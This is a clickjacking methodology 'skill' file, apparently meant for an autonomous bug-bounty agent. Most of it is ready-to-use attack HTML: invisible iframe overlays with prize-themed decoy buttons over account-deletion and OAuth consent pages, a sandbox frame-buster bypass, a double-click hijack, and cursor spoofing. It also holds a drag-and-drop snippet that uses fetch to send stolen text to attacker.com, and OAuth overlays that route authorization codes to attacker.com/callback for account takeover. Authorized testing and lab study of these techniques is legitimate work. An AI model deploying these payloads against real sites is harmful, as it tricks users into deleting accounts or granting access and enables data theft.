# Clickjacking Methodology Skill

**Trigger:** Clickjacking, iframe overlay, X-Frame-Options, frame-ancestors, double-click hijack
**Pattern Note:** `a technique-reference note`
**PortSwigger:** 5 labs | **Ceiling:** Medium-Critical ($500–$10K, OAuth chain)

---

## Quick-Start (Full Autonomy)

### Phase 1 — Check Frameability
```bash
curl -I https://target.com/ | grep -iE "x-frame-options|frame-ancestors"
# Missing headers = FRAMEABLE = test for clickjacking
```

**Quick iframe test (open in browser):**
```html
<iframe src="https://target.com/account/delete" width="900" height="600"></iframe>
```
If page loads inside iframe = frameable.

### Phase 2 — Identify Impact Pages
```
Target these pages first:
- Account deletion / close account
- Email/password change
- OAuth consent / "Allow permissions"
- Payment/purchase confirmation
- Admin actions (grant permissions, invite users)
- "Share" or "Post" actions
- Two-factor enable/disable
```

### Phase 3 — Build PoC
```html
<!DOCTYPE html>
<html><head>
<style>
  iframe { opacity:0.00001; position:absolute; z-index:2; top:0; left:0; width:1000px; height:700px; }
  button { position:absolute; top:[ALIGN_WITH_TARGET_BUTTON]px; left:[ALIGN]px; z-index:1; }
</style>
</head><body>
  <iframe src="https://target.com/account/delete-account"></iframe>
  <p>You've won a prize! Click the button below:</p>
  <button>CLAIM PRIZE</button>
</body></html>
```

**Calibration:** Set opacity to 0.3 temporarily to see where target buttons are, then align decoy button, then set opacity to 0.00001.

### Phase 4 — Frame Buster Bypass
```html
<!-- If target has JS frame buster, add sandbox attribute: -->
<iframe src="https://target.com/..." sandbox="allow-forms allow-scripts"></iframe>
<!-- sandbox blocks top.location redirect but allows page load + form submit -->
```

### Phase 5 — OAuth Chain (Highest Value)
```html
<!-- Overlay on OAuth consent page → victim "approves" attacker's app -->
<iframe src="https://target.com/oauth/authorize?client_id=ATTACKER_CLIENT&scope=full_access&response_type=code&redirect_uri=https://attacker.com/callback"
  style="opacity:0.00001; position:absolute; z-index:2; width:600px; height:500px;"></iframe>
```

---

## Severity Escalation Guide

| Action | Severity | File? |
|--------|----------|-------|
| Delete account | Medium | YES |
| Change email | High | YES |
| OAuth consent approval | High → Critical | YES (chain) |
| Admin action | High | YES |
| Basic form submit | Low | Only if high-impact |

---

## Bug Bounty Notes
- Don't file standalone clickjacking on trivial actions — very low EV
- Chain to OAuth or account takeover for High/Critical payout
- Evidence: video recording showing click alignment + result; HTML PoC file
- Berachain example: `iframe` over the bridge UI → user unknowingly approves bridge action

---

---

## Advanced Techniques (KB Part 2)

### Double-Click Attack
```html
<!-- Victim double-clicks; first click handled by decoy UI, second click by hidden iframe -->
<!-- Effective against "click to confirm" dialogs that require a quick second click -->
<style>
  .decoy-button { position: absolute; z-index: 1; top: 300px; left: 200px; }
  iframe {
    opacity: 0.00001; position: absolute; z-index: 2;
    top: 0; left: 0; width: 100%; height: 100%;
  }
</style>
<button class="decoy-button" ondblclick="void(0)">Double-click to verify</button>
<iframe src="https://target.com/account/confirm-deletion"></iframe>
```

**Why it works:** User thinks they're double-clicking the decoy button. The second click lands on the transparent iframe over a confirmation dialog.

### Drag-and-Drop Content Extraction
```html
<!-- HTML5 drag-and-drop can extract content from cross-origin iframes in some browsers -->
<!-- Attack: victim drags an element from the framed page into an attacker-controlled drop zone -->
<iframe src="https://target.com/sensitive-data" id="victim"></iframe>
<div id="drop-zone" ondrop="exfil(event)" ondragover="event.preventDefault()">
  Drop your prize here!
</div>
<script>
function exfil(event) {
  const data = event.dataTransfer.getData('text');
  fetch('https://attacker.com/exfil?data=' + btoa(data));
}
</script>
<!-- Note: Modern browsers have significantly reduced this attack surface -->
```

### Cursor Manipulation
```css
/* Shift the apparent click target by offsetting the cursor display */
/* User sees cursor in one position; actual click registers elsewhere */
* { cursor: none; }
.fake-cursor {
  position: fixed;
  /* Display cursor offset from actual position */
  transform: translate(150px, 200px);
  pointer-events: none;
  z-index: 99999;
}
```

**Use case:** When button alignment is off by a fixed amount, manipulate cursor display rather than repositioning the iframe.

### Partial Page Framing
```
Even if the main page has X-Frame-Options: SAMEORIGIN,
sub-resources and embedded widgets may not:
- Login widgets / OAuth popups
- Chat widgets embedded via iframe
- Payment processing widgets (Stripe, PayPal checkout)
- Social share buttons

Test each iframe-embedded widget independently:
curl -I https://widget.target.com/ | grep x-frame-options
```

### OAuth Chain (Highest-Value Variant)
```html
<!-- Overlay transparent iframe on OAuth consent page -->
<!-- Victim "clicks approve" on decoy — actually approves attacker's OAuth app -->
<style>
  iframe { opacity: 0.00001; position: absolute; z-index: 2; width: 600px; height: 500px; }
  .decoy { position: absolute; top: 380px; left: 270px; z-index: 1; font-size: 18px; }
</style>
<p class="decoy">Click here to claim your reward!</p>
<iframe src="https://target.com/oauth/authorize?client_id=ATTACKER_APP_ID&scope=read:profile+write:data&response_type=code&redirect_uri=https://attacker.com/callback"></iframe>

<!-- If victim clicks → attacker receives OAuth code → exchanges for access token → ATO -->
<!-- Severity: Critical if scope includes account control actions -->
```

## Chain Paths

| Chain | Severity | EV |
|-------|----------|-----|
| Clickjacking → account deletion | Medium | Low (no ATO) |
| Clickjacking → email change | High | Medium |
| Clickjacking → OAuth consent approval | Critical | High |
| Clickjacking → payment confirmation | High–Critical | High |
| Clickjacking → admin action (grant role) | High | High |
| Clickjacking + CSRF-equivalent bypass | High | High (when cookie-only CSRF token) |

## References

- PortSwigger: https://portswigger.net/web-security/clickjacking
- PortSwigger labs: https://portswigger.net/web-security/clickjacking#labs
- OWASP: https://owasp.org/www-community/attacks/Clickjacking

---

*Enhanced by KB Part 2 ingestion 2026-03-04*

*Skill: clickjacking-methodology | Created 2026-03-04 | Pattern: Cyber-Clickjacking.md*
